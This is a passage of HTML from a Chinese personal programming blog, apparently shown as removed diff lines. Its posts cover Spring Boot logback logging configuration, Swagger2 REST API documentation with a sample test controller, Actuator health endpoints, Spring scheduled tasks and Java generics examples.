class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">	&lt;include resource=&quot;org/springframework/boot/logging/logback/base.xml&quot; /&gt;</span><br><span class="line">	&lt;jmxConfigurator/&gt;</span><br><span class="line">	&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;/home/jzyx/epmnew/logs&quot;/&gt;--&gt;</span><br><span class="line">    &lt;property name=&quot;log.path&quot; value=&quot;D:\\Logs\\aipmanage\\logs\\&quot;/&gt;</span><br><span class="line">	&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;\\opt&quot;/&gt;--&gt;</span><br><span class="line"></span><br><span class="line">	&lt;appender name=&quot;console&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">		&lt;!-- Log message format --&gt;</span><br><span class="line">		&lt;encoder&gt;</span><br><span class="line">			&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class="line">			&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class="line">		&lt;/encoder&gt;</span><br><span class="line">		&lt;!-- deny all events with a level below DEBUG, that is TRACE  --&gt;</span><br><span class="line">		&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class="line">			&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class="line">		&lt;/filter&gt;</span><br><span class="line">	&lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">	&lt;appender name=&quot;sysDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class="line">		&lt;!--  &lt;file&gt;E:\\项目\\demoClientLog\\sys.log&lt;/file&gt;--&gt;</span><br><span class="line">		&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class="line">			&lt;!-- daily rollover --&gt;</span><br><span class="line">			&lt;fileNamePattern&gt;$&#123;log.path&#125;\\demoClient-DEBUG-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class="line">			&lt;!-- 保留30天的日志 --&gt;</span><br><span class="line">			&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class="line">		&lt;/rollingPolicy&gt;</span><br><span class="line">		&lt;encoder&gt;</span><br><span class="line">			&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class="line">			&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class="line">		&lt;/encoder&gt;</span><br><span class="line">		&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class="line">			&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class="line">		&lt;/filter&gt;</span><br><span class="line">	&lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">	&lt;appender name=&quot;infoDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class="line">		&lt;!-- &lt;file&gt;E:\\项目\\demoClientLog\\demoClient-info.log&lt;/file&gt; --&gt;</span><br><span class="line">		&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class="line">			&lt;!-- daily rollover --&gt;</span><br><span class="line">			&lt;fileNamePattern&gt;$&#123;log.path&#125;\\demoClient-INFO-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class="line">			&lt;!-- 保留30天的日志 --&gt;</span><br><span class="line">			&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class="line">		&lt;/rollingPolicy&gt;</span><br><span class="line">		&lt;encoder&gt;</span><br><span class="line">			&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class="line">			&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class="line">		&lt;/encoder&gt;</span><br><span class="line">		&lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt;</span><br><span class="line">			&lt;level&gt;INFO&lt;/level&gt;</span><br><span class="line">			&lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;</span><br><span class="line">			&lt;onMismatch&gt;DENY&lt;/onMismatch&gt;</span><br><span class="line">		&lt;/filter&gt;</span><br><span class="line">	&lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">	&lt;appender name=&quot;severeDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class="line">		&lt;!-- &lt;file&gt;E:\\项目\\demoClientLog\\demoClient-severe.log&lt;/file&gt; --&gt;</span><br><span class="line">		&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class="line">			&lt;!-- daily rollover --&gt;</span><br><span class="line">			&lt;fileNamePattern&gt;$&#123;log.path&#125;\\demoClient-ERROR-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class="line">			&lt;!-- 保留30天的日志 --&gt;</span><br><span class="line">			&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class="line">		&lt;/rollingPolicy&gt;</span><br><span class="line">		&lt;encoder&gt;</span><br><span class="line">			&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class="line">			&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class="line">		&lt;/encoder&gt;</span><br><span class="line">		&lt;!-- deny all events with a level below WARN, that is TRACE, DEBUG, and INFO --&gt;</span><br><span class="line">		&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class="line">			&lt;level&gt;ERROR&lt;/level&gt;</span><br><span class="line">		&lt;/filter&gt;</span><br><span class="line">	&lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">	&lt;logger name=&quot;com.bonc.demoClient&quot; level=&quot;DEBUG&quot;&gt;</span><br><span class="line">		&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class="line">		&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class="line">	&lt;/logger&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- the root level of logging --&gt;</span><br><span class="line">	&lt;root level=&quot;INFO&quot;&gt;</span><br><span class="line">		&lt;appender-ref ref=&quot;sysDailyRollingFile&quot; /&gt;</span><br><span class="line">		&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class="line">		&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class="line">	&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></p>
-<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final Logger logger = LoggerFactory.getLogger(ApiController.class);</span><br><span class="line">.......</span><br><span class="line">logger.info(&quot;.....&quot;);</span><br></pre></td></tr></table></figure>
-<h4 id="2-Restful-API"><a href="#2-Restful-API" class="headerlink" title="2.Restful API"></a>2.Restful API</h4><p>使用swagger2</p>
-<ul>
-<li><p>依赖</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  &lt;!-- Swagger依赖 注意版本一致--&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置类</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@Configuration</span><br><span class="line">@EnableSwagger2</span><br><span class="line">public class Swagger2 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * apis()设置监控路径</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @Bean</span><br><span class="line">    public Docket createRestApi() &#123;</span><br><span class="line">        return new Docket(DocumentationType.SWAGGER_2)</span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                .select()</span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(&quot;com.example.springboottemplate.controllers&quot;))</span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 创建api基本信息，会展示在文档页面</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    private ApiInfo apiInfo() &#123;</span><br><span class="line">        return new ApiInfoBuilder()</span><br><span class="line">                .title(&quot;Swagger2 demo&quot;)</span><br><span class="line">                .description(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)</span><br><span class="line">                .version(&quot;1.0&quot;)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用<br><br><strong>注意：要使用@RequestParam()接收参数，需要paramType=”query”</strong><br><br>具体参数信息:<a href="https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/" target="_blank" rel="noopener">https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/</a></p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">@Api(value = &quot;测试接口类TestController&quot;)</span><br><span class="line">@Controller</span><br><span class="line">@ResponseBody</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class="line"></span><br><span class="line">    @ApiOperation(value = &quot;测试get不带参数&quot;,notes = &quot;测试get不带参数&quot;)</span><br><span class="line">    @RequestMapping(value = &quot;test1&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String test()&#123;</span><br><span class="line">        logger.debug(&quot;test debug&quot;);</span><br><span class="line">        logger.info(&quot;test info&quot;);</span><br><span class="line">        logger.warn(&quot;test warn&quot;);</span><br><span class="line">        logger.error(&quot;test error&quot;);</span><br><span class="line">        logger.fatal(&quot;test fatal&quot;);</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @ApiOperation(value = &quot;测试get带参数&quot;,notes = &quot;测试get带参数&quot;)</span><br><span class="line">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, dataType = &quot;String&quot;,paramType = &quot;query&quot;)</span><br><span class="line">    @RequestMapping(value = &quot;test2&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String test2(@RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class="line">        if(!username.equals(&quot;&quot;) &amp;&amp; username != null)&#123;</span><br><span class="line">            System.out.println(username);</span><br><span class="line">            return username;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            return &quot;null&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @ApiOperation(value = &quot;测试post带实体参数&quot;, notes = &quot;测试post带实体参数&quot;)</span><br><span class="line">    @ApiImplicitParam(name = &quot;user&quot;,value = &quot;用户名&quot;,required = true, dataType = &quot;Map&lt;String,Object&gt;&quot;)</span><br><span class="line">    @ApiResponses(&#123;</span><br><span class="line">           @ApiResponse(code = 400, message = &quot;请求参数没填好,注意为json&quot;),</span><br><span class="line">           @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;),</span><br><span class="line">           @ApiResponse(code = 500, message = &quot;服务器端发生错误&quot;)</span><br><span class="line">   &#125;)</span><br><span class="line">    @RequestMapping(value = &quot;/test3&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String test3(@RequestBody Map&lt;String,Object&gt; user)&#123;</span><br><span class="line">        System.out.println(user.get(&quot;username&quot;).toString());</span><br><span class="line">        System.out.println(user.get(&quot;password&quot;).toString());</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @ApiOperation(value = &quot;测试post参数为String&quot;, notes = &quot;测试post参数为String&quot;)</span><br><span class="line">    @ApiImplicitParams(&#123;</span><br><span class="line">            @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;),</span><br><span class="line">            @ApiImplicitParam(name = &quot;password&quot;, value = &quot;密码&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">    @RequestMapping(value = &quot;/test4&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String test4(@RequestParam(&quot;username&quot;) String username,</span><br><span class="line">                        @RequestParam(&quot;password&quot;) String passwprd)&#123;</span><br><span class="line">       return username + &quot;:&quot; + passwprd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @ApiOperation(value = &quot;测试restful类型接口&quot;, notes = &quot;测试restful类型接口&quot;)</span><br><span class="line">    @RequestMapping(value = &quot;/test5/&#123;name&#125;&quot;, method = RequestMethod.GET)</span><br><span class="line">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class="line">    public String test5(@PathVariable(&quot;name&quot;) String name,</span><br><span class="line">                        @RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class="line">        return name + &quot; : &quot; + username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>访问:<a href="http://127.0.0.1:8080/swagger-ui.html" target="_blank" rel="noopener">http://127.0.0.1:8080/swagger-ui.html</a></p>
-<h4 id="3-Health"><a href="#3-Health" class="headerlink" title="3.Health"></a>3.Health</h4><p>这是2.0版本：<a href="https://blog.csdn.net/alinyua/article/details/80009435" target="_blank" rel="noopener">https://blog.csdn.net/alinyua/article/details/80009435</a><br><br>可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息</p>
-<ul>
-<li><p>依赖</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">    &lt;!--&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;--&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Springboot2版本需要在application.properties加入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line">#显示所有健康状态，需要加配置</span><br><span class="line">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure>
-<p>内置EndPoints：</p>
-<blockquote>
-<p><a href="http://127.0.0.1:8080/actuator" target="_blank" rel="noopener">http://127.0.0.1:8080/actuator</a><br><br><a href="http://127.0.0.1:8080/actuator/health" target="_blank" rel="noopener">http://127.0.0.1:8080/actuator/health</a><br><br><a href="http://127.0.0.1:8080/actuator/info" target="_blank" rel="noopener">http://127.0.0.1:8080/actuator/info</a><br><br><a href="http://127.0.0.1:8080/actuator/beans" target="_blank" rel="noopener">http://127.0.0.1:8080/actuator/beans</a><br><br><a href="http://127.0.0.1:8080/actuator/httptrace" target="_blank" rel="noopener">http://127.0.0.1:8080/actuator/httptrace</a></p>
-</blockquote>
-</li>
-</ul>
-<h4 id="4-Eureka"><a href="#4-Eureka" class="headerlink" title="4.Eureka"></a>4.Eureka</h4>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">springboot</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/23/java/springboot架子/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/spring-schdule" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/19/java/spring-schdule/">spring-schdule</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/19/java/spring-schdule/" class="archive-article-date">
-  	<time datetime="2018-11-19T03:18:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-Schduled注解"><a href="#1-Schduled注解" class="headerlink" title="1.@Schduled注解"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>
-<h4 id="2-实现ScheduingConfigurer接口"><a href="#2-实现ScheduingConfigurer接口" class="headerlink" title="2.实现ScheduingConfigurer接口"></a>2.实现ScheduingConfigurer接口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">@Lazy(false)</span><br><span class="line">@EnableScheduling</span><br><span class="line">@Component</span><br><span class="line">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class="line"></span><br><span class="line">	@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class="line">	private String callCron;</span><br><span class="line"></span><br><span class="line">  //重写configureTasks</span><br><span class="line">	@Override</span><br><span class="line">	public void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class="line">		if(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class="line">			taskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class="line">				@Override</span><br><span class="line">				public void run() &#123;</span><br><span class="line">					//doSomething</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;, new Trigger() &#123;</span><br><span class="line"></span><br><span class="line">				@Override</span><br><span class="line">				public Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class="line">          //定时器触发，callCron为定时表达式</span><br><span class="line">					CronTrigger trigger = new CronTrigger(callCron);</span><br><span class="line">					Date nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class="line">					return nextExecDate;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">springboot</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/19/java/spring-schdule/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/泛型" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/15/java/泛型/">泛型</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/15/java/泛型/" class="archive-article-date">
-  	<time datetime="2018-11-15T03:41:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-lt-T"><a href="#1-lt-T" class="headerlink" title="1. &lt;T>"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>
-<p>类型绑定: <t extends="" xxx=""> 表示T为继承XXX类型的子类<br></t></p>
-<h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h4><h6 id="1-泛型类"><a href="#1-泛型类" class="headerlink" title="1.泛型类"></a>1.泛型类</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class GenericDemo &lt;T&gt;&#123;</span><br><span class="line">    public   T test(T t)&#123;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class="line">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h6 id="2-泛型方法"><a href="#2-泛型方法" class="headerlink" title="2.泛型方法"></a>2.泛型方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class GenericMethod &#123;</span><br><span class="line">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">    public static  void  main(String[] args) &#123;</span><br><span class="line">        System.out.println(test(&quot;aa&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h6 id="3-泛型接口"><a href="#3-泛型接口" class="headerlink" title="3.泛型接口"></a>3.泛型接口</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class="line">    T test(U u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String test(String a)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/15/java/泛型/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/reflect" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/07/java/reflect/">Java反射</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/07/java/reflect/" class="archive-article-date">
-  	<time datetime="2018-11-07T02:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
